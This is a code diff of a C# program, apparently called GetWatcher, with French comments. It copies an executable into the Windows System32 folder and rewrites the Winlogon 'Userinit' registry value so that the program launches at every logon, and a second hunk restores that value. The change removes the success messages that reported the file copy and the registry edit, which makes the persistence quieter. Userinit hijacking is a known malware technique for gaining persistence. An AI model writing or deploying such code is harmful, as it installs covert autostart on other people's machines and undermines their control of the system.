@@ -260,7 +260,6 @@ public class GetWatcher
                 {
                 // Copier le fichier exécutable
                 File.Copy(sourcePath_install, destinationPath_install, true);
-                Console.WriteLine("[+] Fichier copié avec succès.");
                 try
                     {
                     // Ouvrir la clé de registre
@@ -270,11 +269,10 @@ public class GetWatcher
                     {
                         // Modifier la valeur de la clé UserInit
                         key.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe, C:\\Windows\\System32\\GetWatcher.exe", RegistryValueKind.String);
-                        Console.WriteLine("[+] La clé de registre UserInit a été modifiée avec succès.");
                     }
                     else
                     {
-                        Console.WriteLine("[X] La clé de registre UserInit n'a pas été trouvée.");
+                        Console.WriteLine("[X] La clé de registre n'a pas été trouvée.");
                     }
 
                     // Crée une clé de registre
@@ -316,11 +314,10 @@ public class GetWatcher
                     {
                         // Modifier la valeur de la clé UserInit
                         key.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,", RegistryValueKind.String);
-                        Console.WriteLine("[+] La clé de registre UserInit a été modifiée avec succès.");
                     }
                     else
                     {
-                        Console.WriteLine("[X] La clé de registre UserInit n'a pas été trouvée.");
+                        Console.WriteLine("[X] La clé de registre n'a pas été trouvée.");
                     } }
                     catch (Exception ex) { Console.WriteLine($"[X] Une erreur s'est produite : {ex.Message}"); }
 
